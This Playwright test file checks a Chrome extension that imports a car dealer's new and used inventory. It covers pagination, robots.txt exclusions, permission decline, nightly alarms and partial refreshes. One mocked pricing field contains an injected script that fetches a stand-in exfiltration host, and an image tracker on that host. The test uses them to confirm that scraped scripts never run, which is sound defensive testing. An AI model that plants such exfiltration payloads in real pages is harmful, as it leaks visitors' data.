import { test, expect, chromium } from '@playwright/test';
import { cp, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import AxeBuilder from '@axe-core/playwright';

const KEY = 'payment-desk.inventory.v1';
const site = 'https://dealer.example.com/';
const source = fileURLToPath(new URL('../../extension-dist/payment-desk-companion/', import.meta.url));
let directory, context, panel, requests, failUsed, denyRobots, wrongCount;
const config = type => ({ DealerId: 123, PageId: type === 'new' ? 10 : 20, BaseFilter: type === 'new' ? "type='n'" : "type='u'", DealerModel: { CurrencyCode: 'USD' }, PageVehicleType: type });
const card = (type, number) => ({ IsAdCard: false, VehicleCard: {
  VehicleYear: 2024, VehicleMake: 'Ford', VehicleModel: type === 'new' ? 'Explorer' : 'Escape', VehicleTrim: 'XLT',
  VehicleStockNumber: `${type === 'new' ? 'N' : 'U'}${number}`, VehicleVin: `1FM5K8D80MGA1234${number}`, VehicleCondition: type,
  VehicleDetailUrl: `${site}${type}/vehicle-${number}`, VehicleMileage: type === 'new' ? 12 : 12345,
  VehicleInStock: true, Features: ['Heated seats', 'Rear camera'],
  VehicleImageModel: { VehicleNameHtmlEncoded: `2024 Ford ${type === 'new' ? 'Explorer' : 'Escape'} XLT`, DealerName: 'Example dealer', VehicleImageCarouselModel: { PhotoList: ['/photo.jpg'] } },
  WasabiVehiclePricingPanelViewModel: { PriceStakViewModel: { PriceStakTabsModel: { BuyContent: `<div class="featuredPrice"><span class="vehiclePricingHighlightAmount">$30,280</span></div><li class="priceBlockItemPrice"><span class="priceBlocItemPriceLabel">${type === 'new' ? 'Selling Price:' : 'Retail Price:'}</span><span class="priceBlocItemPriceValue">$30,000</span></li><li class="priceBlockItemPrice"><span class="priceBlocItemPriceLabel">MSRP:</span><span class="priceBlocItemPriceValue">$35,000</span></li><script>fetch('https://exfil.example.com/')</script><img src="https://exfil.example.com/tracker">` } } },
} });
const response = (type, page) => ({ DisplayCards: [card(type, type === 'new' ? 1 : page + 1)], Paging: { PaginationDataModel: { PageNumber: page, TotalPages: type === 'new' ? 1 : 2, TotalCount: type === 'new' ? 1 : 2 } } });

test.beforeEach(async () => {
  directory = await mkdtemp(join(tmpdir(), 'pd-inventory-test-'));
  const unpacked = join(directory, 'extension');
  await cp(source, unpacked, { recursive: true });
  const manifest = JSON.parse(await readFile(join(unpacked, 'manifest.json'), 'utf8'));
  // Only the synthetic dealer is pre-granted in this isolated test package.
  // Production grants the chosen website through Chrome's native permission UI.
  manifest.host_permissions = ['https://dealer.example.com/*', 'https://www.dealer.example.com/*'];
  await writeFile(join(unpacked, 'manifest.json'), JSON.stringify(manifest));
  context = await chromium.launchPersistentContext(join(directory, 'profile'), { channel: 'chromium', headless: true, args: [`--disable-extensions-except=${unpacked}`, `--load-extension=${unpacked}`, '--disable-background-mode'] });
  requests = []; failUsed = false; denyRobots = false; wrongCount = false;
  context.on('request', request => requests.push(request.url()));
  await context.route('https://dealer.example.com/**', async route => {
    const url = new URL(route.request().url());
    if (url.pathname === '/robots.txt') return route.fulfill({ contentType: 'text/plain', body: `User-agent: *\n${denyRobots ? 'Disallow' : 'Allow'}: /` });
    if (url.pathname === '/photo.jpg') return route.fulfill({ status: 404, body: '' });
    if (url.pathname === '/') return route.fulfill({ contentType: 'text/html', body: '<a href="/searchnew.aspx">New inventory</a><a href="/searchused.aspx">Used inventory</a>' });
    if (/search(new|used)\.aspx/.test(url.pathname)) {
      const type = url.pathname.includes('new') ? 'new' : 'used';
      return route.fulfill({ contentType: 'text/html', body: `<script id="dlron-srp-model" type="application/json">${JSON.stringify(config(type))}</script>` });
    }
    if (url.pathname.includes('/api/vhcliaa/')) {
      const type = url.pathname.endsWith('/10') ? 'new' : 'used';
      if (failUsed && type === 'used') return route.fulfill({ status: 403, body: 'blocked' });
      const body = response(type, Number(url.searchParams.get('pt')));
      if (wrongCount && type === 'used') body.Paging.PaginationDataModel.TotalCount = 99;
      return route.fulfill({ json: body });
    }
    return route.fulfill({ status: 404, body: '' });
  });
  let [worker] = context.serviceWorkers(); worker ??= await context.waitForEvent('serviceworker');
  panel = await context.newPage();
  await panel.setViewportSize({ width: 360, height: 850 });
  await panel.goto(`chrome-extension://${new URL(worker.url()).hostname}/sidepanel.html`);
  await expect(panel.frameLocator('#desk').locator('#sale-price')).toBeVisible();
  await panel.getByRole('button', { name: 'Inventory', exact: true }).click();
});
test.afterEach(async () => { await context?.close(); await rm(directory, { recursive: true, force: true }); });
const saved = () => panel.evaluate(async key => (await chrome.storage.local.get(key))[key], KEY);
async function connect() {
  await panel.locator('#dealership-site').fill(site);
  await panel.getByRole('button', { name: 'Connect and refresh' }).click();
  await expect.poll(async () => (await saved())?.status, { timeout: 30_000 }).toBe('ready');
}

test('connects both inventories, follows all pages, shows data, and reviews without clearing a deal', async () => {
  await connect();
  const state = await saved();
  expect(state.vehicles).toHaveLength(3);
  expect(state.vehicles[0]).toMatchObject({ price: 30000, websitePrice: 30280, msrp: 35000, listed: true });
  expect(state.vehicles.map(v => v.condition).sort()).toEqual(['new', 'used', 'used']);
  expect(requests.some(url => url.includes('pt=2'))).toBe(true);
  expect(requests.some(url => url.includes('exfil'))).toBe(false);
  expect(await panel.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  expect((await new AxeBuilder({ page: panel }).analyze()).violations).toEqual([]);
  await panel.locator('#inventory-search').fill('U2');
  await expect(panel.locator('.inventory-card')).toHaveCount(1);
  await panel.locator('.inventory-card summary').click();
  await expect(panel.locator('.inventory-card')).toContainText('1FM5K8D80MGA12342');
  const desk = panel.frameLocator('#desk');
  await desk.locator('#sale-price').fill('40000');
  await panel.getByRole('button', { name: 'Use vehicle' }).click();
  await expect(panel.locator('#price')).toHaveValue('30000');
  await panel.getByRole('button', { name: 'Review in worksheet' }).click();
  await expect(desk.getByRole('dialog')).toContainText('clear the current deal figures');
  await expect(desk.locator('#sale-price')).toHaveValue('40,000');
  await desk.getByRole('button', { name: 'Cancel', exact: true }).click();
  await expect(desk.locator('#sale-price')).toHaveValue('40,000');
});

test('blocked partial refresh preserves cached vehicles and completion time; disconnect clears catalog and alarms', async () => {
  await connect();
  const previous = await saved(); failUsed = true;
  await panel.getByRole('button', { name: 'Refresh now' }).click();
  await expect.poll(async () => (await saved())?.status, { timeout: 30_000 }).toBe('partial');
  const partial = await saved();
  expect(partial.lastCompletedAt).toBe(previous.lastCompletedAt);
  expect(partial.vehicles).toHaveLength(3);
  expect(partial.vehicles.every(v => v.listed)).toBe(true);
  await expect(panel.locator('#inventory-notice')).toContainText('403');
  await panel.locator('#inventory-settings summary').click();
  await panel.getByRole('button', { name: 'Disconnect and clear inventory' }).click();
  await expect.poll(saved).toBeUndefined();
  await expect.poll(() => panel.evaluate(async () => (await chrome.alarms.getAll()).filter(a => a.name.startsWith('payment-desk-inventory')).length)).toBe(0);
});

test('nightly alarm resumes a due refresh with the panel closed and automatic updates can be disabled', async () => {
  await connect();
  const first = await saved();
  const manifestId = new URL(panel.url()).hostname;
  await panel.evaluate(async key => {
    const state = (await chrome.storage.local.get(key))[key]; state.nextRefreshAt = Date.now() - 100;
    await chrome.storage.local.set({ [key]: state });
    await chrome.alarms.create('payment-desk-inventory-night', { when: Date.now() + 1000 });
  }, KEY);
  await panel.close();
  let [worker] = context.serviceWorkers();
  await expect.poll(async () => (await worker.evaluate(async key => (await chrome.storage.local.get(key))[key], KEY))?.lastAttemptAt, { timeout: 30_000 }).toBeGreaterThan(first.lastAttemptAt);
  await expect.poll(async () => (await worker.evaluate(async key => (await chrome.storage.local.get(key))[key], KEY))?.status, { timeout: 30_000 }).toBe('ready');
  panel = await context.newPage(); await panel.goto(`chrome-extension://${manifestId}/sidepanel.html`);
  await panel.getByRole('button', { name: 'Inventory', exact: true }).click();
  await panel.locator('#inventory-settings summary').click();
  await panel.locator('#inventory-nightly').uncheck();
  await expect.poll(async () => (await saved()).config.nightly).toBe(false);
  await expect.poll(() => panel.evaluate(() => chrome.alarms.get('payment-desk-inventory-night'))).toBeUndefined();

  // Recreate a persisted queue paused by a long Crawl-delay when 2 AM arrives.
  // The real alarm must advance to tomorrow without starting another refresh.
  await panel.evaluate(async key => {
    const state = (await chrome.storage.local.get(key))[key];
    state.config.nightly = true; state.nextRefreshAt = Date.now() - 100;
    state.status = 'syncing';
    state.job = { id: 'paused-overnight', startedAt: Date.now(), queue: [{ url: state.config.site, kind: 'robots' }], visited: [], vehicles: [], groups: {}, policies: {}, warnings: [], provider: '', nextRequestAt: Date.now() + 60_000 };
    await chrome.storage.local.set({ [key]: state });
    await chrome.alarms.create('payment-desk-inventory-night', { when: Date.now() + 500 });
  }, KEY);
  const overnight = Date.now();
  await expect.poll(async () => (await saved()).nextRefreshAt, { timeout: 10_000 }).toBeGreaterThan(overnight);
  expect((await saved()).job.id).toBe('paused-overnight');
  await expect.poll(() => panel.evaluate(async () => (await chrome.alarms.get('payment-desk-inventory-night'))?.scheduledTime)).toBeGreaterThan(overnight);
});

test('DealerCarSearch parses real card labels, VIN, mileage and page counts without scripts', async () => {
  const result = await panel.evaluate(async () => {
    const { parseInventoryHtml } = await import('./inventoryParser.js');
    const html = '<span class="LabelCityStateZip1">Roseville, MI 48066</span><span class="pager-summary">Page: 1 of 2 (2 vehicles)</span><div class="invMainCell"><h4 class="vehicleTitleH4"><a aria-label="2023 Ford Escape SE" href="/vdp/123/Used-2023-Ford-Escape">2023 Ford Escape</a></h4><div data-vin="1FM5K8D80MGA12345"></div><p>Stock #: U123 Mileage: 45,123</p><div class="i18r_customPricing"><div class="CustomPricing_Main"><div class="price"><label class="price-label">Retail Price</label><span class="price-price">$24,995</span></div></div></div><div class="mainImgWrap"><img data-src="/photo.jpg"></div></div>';
    return parseInventoryHtml(html, { url: 'https://dealer.example.com/inventory', kind: 'html' }, 'https://dealer.example.com/', 123);
  });
  expect(result.vehicles[0]).toMatchObject({ vin: '1FM5K8D80MGA12345', stock: 'U123', mileage: 45123, price: 24995 });
  expect(result.tasks[0].url).toBe('https://dealer.example.com/inventory?page=2');
  expect(result.expected).toBe(2);
});

test('declining a new website leaves the old connection intact; robots exclusions stop automated inventory requests', async () => {
  await connect();
  const previous = await saved();
  await panel.locator('#inventory-settings summary').click();
  await panel.locator('#dealership-site').fill('https://another.example.com/');
  // The native optional-permission prompt is the one browser UI surface that
  // cannot be clicked in headless Chrome; simulate its decline, not inventory I/O.
  await panel.evaluate(() => { chrome.permissions.request = async () => false; });
  await panel.getByRole('button', { name: 'Connect and refresh' }).click();
  await expect(panel.locator('#inventory-notice')).toContainText('not granted');
  expect((await saved()).config).toEqual(previous.config);
  denyRobots = true;
  const before = requests.length;
  await panel.getByRole('button', { name: 'Refresh now' }).click();
  await expect.poll(async () => (await saved())?.status, { timeout: 30_000 }).toBe('error');
  expect((await saved()).vehicles).toEqual(previous.vehicles);
  // Cached thumbnails are rendered by the open picker; only the background
  // inventory read must stop after robots.txt.
  expect(requests.slice(before).filter(url => url.startsWith(site) && !url.endsWith('/photo.jpg'))).toEqual([`${site}robots.txt`]);
});

test('inconsistent vehicle counts cannot publish a complete refresh or remove cached vehicles', async () => {
  await connect();
  const previous = await saved(); wrongCount = true;
  await panel.getByRole('button', { name: 'Refresh now' }).click();
  await expect.poll(async () => (await saved())?.status, { timeout: 30_000 }).toBe('partial');
  const state = await saved();
  expect(state.lastCompletedAt).toBe(previous.lastCompletedAt);
  expect(state.vehicles.every(vehicle => vehicle.listed)).toBe(true);
  await expect(panel.locator('#inventory-notice')).toContainText('page counts');
});
